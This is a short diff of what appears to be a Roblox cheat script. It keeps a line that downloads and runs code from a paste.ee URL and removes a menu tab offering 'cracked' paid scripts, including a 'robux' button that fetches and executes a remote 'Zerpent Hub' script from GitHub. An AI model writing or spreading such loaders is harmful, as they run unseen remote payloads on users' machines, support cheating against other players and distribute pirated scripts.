@@ -125,10 +125,3 @@ getgenv().IgnoredList = { --ignored people (script won't delete popits from thes
 local domain = "paste.ee"
 loadstring(game:HttpGet("https://"..domain.."/r/WFYpr/0"))()
 end)
-
-
- local Tab = Window:NewTab("script crackeado") local Section = Tab:NewSection("scripts de paga gratis")
- 
- Section:NewButton("script serpent" , "scrript de robux", function()
- loadstring(game:HttpGet("https://raw.githubusercontent.com/Playgames291/Script/main/Zerpent%20Hub%20V2%20FIXED"))())
-end)
